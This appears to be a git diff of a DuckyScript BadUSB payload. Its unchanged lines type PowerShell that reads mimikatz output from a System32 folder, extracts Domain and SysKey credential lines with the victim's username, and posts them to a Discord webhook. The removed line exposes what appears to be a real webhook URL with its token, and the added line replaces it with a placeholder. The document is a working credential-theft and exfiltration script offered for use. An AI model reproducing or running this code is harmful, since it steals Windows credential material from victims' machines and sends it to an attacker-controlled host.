@@ -60,7 +60,7 @@ ENTER
 DELAY 1000
 
 REM ##Put your Discord webhook URL here##
-STRING $webhookUrl = "https://discord.com/api/webhooks/1326669340954726462/aJLNY6uqtqLWG4ETe2jBi67BMTjr-sUw4flP-2F91EDy9bVC-doucOatKLC-aQR7UDbb"
+STRING $webhookUrl = "<your_webhook_url"
 
 ENTER
 STRING $hash = Get-Content -Path "C:\Windows\System32\mimikatz\mimi.txt"; $domain = $hash | Where-Object { $_ -match "Domain\s*:" }; $sysKey = $hash | Where-Object { $_ -match "SysKey\s*:" }; $username= $env:username; if ($domain.Count -eq 0 -or $sysKey.Count -eq 0) { $Body = @{ 'username' = "Erreur : Pas de données trouvées"; 'content'  = "Aucune donnée trouvée pour 'Domain :' ou 'SysKey'." } } else { $Body = @{ 'username' = "Hash win de $username"; 'content'  = ($domain -join "`n") + "`n" + ($sysKey -join "`n") } }; Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ContentType "application/json"
